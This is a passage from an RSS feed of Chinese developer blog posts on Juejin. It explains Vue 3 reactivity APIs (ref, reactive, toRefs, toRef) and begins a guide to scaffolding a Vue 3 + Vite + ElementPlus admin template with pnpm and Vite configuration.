<li>可与vue2中的data,method,computed 等混用,而且在data,method...中也可以访问到setup中的属性和方法(因为setup先执行,数据方法都挂载到vm上,可以通过this访问到)</li>
<li>setup不能访问vue2中的配置(data,method),原因在于setup先执行,此时this还是undefined</li>
</ol>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(3)ref,reactive,toRefs,toRef]]></title>    <link>https://juejin.cn/post/7583973472323272719</link>    <guid>https://juejin.cn/post/7583973472323272719</guid>    <pubDate>2025-12-16T03:44:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472323272719" data-draft-id="7583971282892505140" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(3)ref,reactive,toRefs,toRef"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:44:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端无涯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(3)ref,reactive,toRefs,toRef
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端无涯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:44:29.000Z" title="Tue Dec 16 2025 03:44:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">ref</h2>
<ul>
<li>
<p><strong>作用：</strong> 定义响应式变量。</p>
</li>
<li>
<p><strong>语法：</strong> <code>let name= ref('测试')</code>。</p>
</li>
<li>
<p><strong>返回值：</strong> 一个<code>RefImpl</code>的实例对象，简称<code>ref对象</code>或<code>ref</code>，<code>ref</code>对象的<code>value</code><strong>属性是响应式的</strong>。</p>
</li>
<li>
<p><strong>注意点：</strong></p>
<ul>
<li><code>JS</code>中操作数据需要：<code>name.value</code>，但模板中不需要<code>.value</code>，直接使用即可。</li>
<li>对于<code>let name = ref('测试')</code>来说，<code>name</code>不是响应式的，<code>name.value</code>是响应式的。</li>
<li>其实<code>ref</code>接收的数据可以是：<strong>基本类型</strong>、<strong>对象类型</strong>。</li>
<li>若<code>ref</code>接收的是对象类型，内部其实也是调用了<code>reactive</code>函数。</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>姓名：{{name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {ref} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> name = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'测试'</span>)

</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-1"> reactive</h2>
<ul>
<li><strong>作用：</strong> 定义一个<strong>响应式对象</strong>（基本类型不要用它，要用<code>ref</code>，否则报错）</li>
<li><strong>语法：</strong> <code>let 响应式对象= reactive(源对象)</code>。</li>
<li><strong>返回值：</strong> 一个<code>Proxy</code>的实例对象，简称：响应式对象。</li>
<li><strong>注意点：</strong> <code>reactive</code>定义的响应式数据是“深层次”的。</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>姓名：{{people.name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>年龄：{{people.age}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {reactive} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> people = <span class="hljs-title function_">reactive</span>({<span class="hljs-attr">name</span>:<span class="hljs-string">'测试'</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>})

</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-2"> ref和reactive区别</h2>
<h4 data-id="heading-3">定义数据类型</h4>
<p><strong>ref</strong>:基本数据类型(如 <code>string</code>、<code>number</code>、<code>boolean</code>),对象数据类型(如 数组,对象)</p>
<p><strong>reactive</strong>: 对象数据类型</p>
<h4 data-id="heading-4">使用区别</h4>
<ol>
<li><code>ref</code>创建的变量必须使用<code>.value</code>（可以使用<code>volar</code>插件自动添加<code>.value</code>）。</li>
<li><code>reactive</code>重新分配一个新对象，会<strong>失去</strong>响应式（可以使用<code>Object.assign</code>去整体替换）。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bcb5cb99b0542c0b43dc6de5cdcd1e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461469&amp;x-signature=zLbFLqU5euf1Z2Ipsieg04u9NM8%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
<blockquote>
<p>实际使用过程中, 一个基本类型的响应式数据，必须使用<code>ref</code> ,对象层级不深ref,reactive两者都行,层级比较多一般用reactive(实际可以ref一把梭,就是代码里面.value比较多,看起来不美观)</p>
</blockquote>
<h2 data-id="heading-5">toRefs和toRef </h2>
<ul>
<li>作用：将一个响应式对象中的每一个属性，转换为<code>ref</code>对象。常用于 <strong>解构</strong> 时保持响应式。</li>
<li>备注：<code>toRefs</code>与<code>toRef</code>功能一致，但<code>toRefs</code>可以批量转换。</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>姓名：{{people.name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>年龄：{{people.age}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {reactive} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> people = <span class="hljs-title function_">reactive</span>({<span class="hljs-attr">name</span>:<span class="hljs-string">'测试'</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>})
<span class="hljs-comment">// 通过toRefs 将people中的多个属性取出,并保持响应式能力</span>
<span class="hljs-keyword">let</span> {name,age} = <span class="hljs-title function_">toRefs</span>(people)
<span class="hljs-comment">// 通过toRef 将people中的某个属性取出,并保持响应式能力</span>
<span class="hljs-keyword">let</span> age = <span class="hljs-title function_">toRef</span>(people,<span class="hljs-string">'age'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-6">面试重点</h2>
<h4 data-id="heading-7">为什么ref要用.value</h4>
<blockquote>
<ul>
<li><strong>基本数据类型</strong>：<code>ref</code> 包装的基本数据类型（如数字、字符串）并不直接是一个对象，它们是原始值。因此，<code>ref</code> 使用 <code>.value</code> 来访问或修改实际的值。</li>
<li><strong>包装行为</strong>：<code>ref</code> 是为了让 Vue 追踪这些数据的变化并保持响应式，使用 <code>.value</code> 是 Vue 设计的一部分，用来明确区分原始值和响应式对象。</li>
</ul>
</blockquote>
<h4 data-id="heading-8">为什么reactive不使用.value</h4>
<blockquote>
<ul>
<li><code>reactive</code> 是通过 <strong>代理对象</strong> 来实现响应式的。<code>reactive</code> 返回的是一个 <strong>代理对象</strong>，当你访问对象的属性时，代理会处理 getter 和 setter 操作来实现响应式。</li>
<li>这种方式是 Vue 3 中的 <strong>Proxy</strong> API 工作机制的体现，因此不需要 <code>.value</code>，可以直接访问对象的属性。</li>
</ul>
</blockquote>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手摸手快速搭建 Vue3 + ElementPlus 后台管理系统模板，使用 JavaScript]]></title>    <link>https://juejin.cn/post/7584014975241879562</link>    <guid>https://juejin.cn/post/7584014975241879562</guid>    <pubDate>2025-12-16T03:34:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584014975241879562" data-draft-id="7581412607061180462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手摸手快速搭建 Vue3 + ElementPlus 后台管理系统模板，使用 JavaScript"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T03:34:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金挖土"/> <meta itemprop="url" content="https://juejin.cn/user/3681619519481069"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手摸手快速搭建 Vue3 + ElementPlus 后台管理系统模板，使用 JavaScript
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3681619519481069/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金挖土
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:34:51.000Z" title="Tue Dec 16 2025 03:34:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 + Vite + ElementPlus + JavaScript 后台管理系统模板</h2>
<h3 data-id="heading-1">废话写在前面</h3>
<p>对于咱这些在小公司摸爬滚打（混吃等死）的前端胶水工程师来说，经常面对的业务就是各种纷繁复杂（大差不差）的后台管理系统了，以前是 <code>Vue2 + ElementUI</code> 一把梭，现在都快 2026 年了 bro，AI 都不写公元前的那一套了，咱再不动一动挪一挪，那真有点说不过去了，新项目还是上点略新一点的活整整吧</p>
<p>话说小公司讲究一个什么，那就是不讲究，额额，讲究一个快速开发业务，这里就不得不提一下 JavaScript 最初的灵活性了，用 TypeScript 总感觉有点自缚手脚，大炮打苍蝇的赶脚，而且就砸门那两碗水，写到最后也是 anyScript。所以还是使用 JavaScript 吧，不过该有的规范还是得有的，不然成石山了扣到咱头上也不好处理不是</p>
<p>ok 话不多杯，准备开整！（进入正题就不废话了，什么？你问我前面为啥要废话，废话，不是废话正经人谁看啊）</p>
<hr/>
<h3 data-id="heading-2">创建项目</h3>
<p>环境准备：</p>
<ul>
<li>nodejs 版本：建议大于 20</li>
<li>使用 pnpm</li>
<li>VSCode 插件 - <code>Vue (Official)</code></li>
</ul>
<p>找一个看得顺眼的目录执行命令：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm create vite elementplus-js-admin -- --template vue
</code></pre>
<p>解释下这段命令干啥的：</p>



































<table><thead><tr><th>分段</th><th>含义</th><th>注意事项</th></tr></thead><tbody><tr><td><code>pnpm create</code></td><td>调用 <code>pnpm</code> 的「脚手架生成器」</td><td>等价于 <code>npm create</code> / <code>yarn create</code></td></tr><tr><td><code>vite</code></td><td>告诉 <code>pnpm</code> 要拉取的脚手架包是 <code>create-vite</code></td><td>底层会运行 <code>npx create-vite</code></td></tr><tr><td><code>elementplus-admin-js</code></td><td>生成的<strong>项目文件夹名</strong></td><td>不要带空格、特殊符号</td></tr><tr><td><code>--</code></td><td><strong>参数分隔符</strong></td><td>告诉 pnpm：后面是传给脚手架的参数，不是给 pnpm 的</td></tr><tr><td><code>--template vue</code></td><td>传给 <code>create-vite</code> 的参数<strong>指定模板</strong></td><td>只能是 <code>vue</code>, <code>react</code>, <code>vanilla</code>… 之一</td></tr></tbody></table>
<p>进入到刚创建的目录并执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> elementplus-js-admin
pnpm dev
</code></pre>
<p>好了，嗖的一下，大功告成（就问你快不快吧）</p>
<h3 data-id="heading-3">配置路径别名</h3>
<p><code>vue.config.js</code> 中：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
    },
  },
})
</code></pre>
<p>另外，想要让 VSCode 在输入 <code>@</code> 的时候有智能提示，需要新建 <code>jsconfig.json</code> 文件：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"."</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"paths"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"@/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/*"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"dist"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">Element Plus</h3>
<h4 data-id="heading-5">安装</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add element-plus
</code></pre>
<h4 data-id="heading-6">配置自动导入 (推荐)</h4>
<p>为了获得最佳的开发体验和打包体积优化，推荐使用<strong>自动导入</strong>。需要安装两个插件：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unplugin-vue-components unplugin-auto-import
</code></pre>
<p>简单介绍一下这两个插件的作用：</p>
<ul>
<li>AutoImport ：让你在 JS 代码中直接使用 ElementPlus 的 <strong>API</strong></li>
<li>Components ：让你在模板中直接使用 ElementPlus 的<strong>组件</strong></li>
</ul>
<p>如果要使用 ElementPlus 的图标，还需要安装自动导入 icons 依赖：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unplugin-icons
</code></pre>
<p>然后修改 <code>vite.config.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AutoImport</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-auto-import/vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">IconsResolver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-icons/resolver'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Icons</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-icons/vite'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElementPlusResolver</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/resolvers'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Components</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/vite'</span>
